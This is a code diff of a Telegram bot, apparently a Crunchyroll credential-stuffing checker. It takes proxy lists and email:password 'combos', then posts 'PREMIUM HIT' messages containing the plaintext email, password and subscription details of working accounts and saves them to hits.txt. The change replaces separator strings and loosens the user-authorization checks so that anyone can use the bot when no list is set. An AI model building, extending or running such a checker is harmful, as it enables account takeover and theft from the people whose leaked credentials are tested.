@@ -171,7 +171,7 @@ class CrunchyrollChecker:
 async def send_result(chat_id, result):
     if result['status'] == 'PREMIUM':
         capture = f"""
-{'='*70}
+======================================================================
 EMAIL: {result['email']}
 PASSWORD: {result['password']}
 STATUS: {result['status']}
@@ -186,7 +186,7 @@ PLAN DURATION: {result.get('plan_duration', 'N/A')}
 ACTIVE: {result.get('active', 'N/A')}
 COUNTRY: {result.get('country', 'N/A')}
 CHECKED BY: @Cr_chker001_bot
-{'='*70}
+======================================================================
 """
         await bot.send_message(chat_id, f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
         with open("hits.txt", "a", encoding="utf-8") as f:
@@ -199,21 +199,21 @@ CHECKED BY: @Cr_chker001_bot
 
 @dp.message(Command("start"))
 async def start(message: types.Message):
-    if message.from_user.id not in AUTHORIZED_USERS:
+    if message.from_user.id not in AUTHORIZED_USERS and AUTHORIZED_USERS:  # allow everyone if no authorized list
         return
     await message.answer("✅ Bot ready.\n\nSend /proxies to load proxies\nUse /check for combos (small batches only)")
 
 
 @dp.message(Command("proxies"))
 async def proxies_cmd(message: types.Message):
-    if message.from_user.id not in AUTHORIZED_USERS:
+    if message.from_user.id not in AUTHORIZED_USERS and AUTHORIZED_USERS:
         return
     await message.answer("📤 Send your proxy file (.txt) or paste proxies (one per line)")
 
 
 @dp.message(F.document | F.text)
 async def handle(message: types.Message):
-    if message.from_user.id not in AUTHORIZED_USERS:
+    if message.from_user.id not in AUTHORIZED_USERS and AUTHORIZED_USERS:
         return
 
     global checker
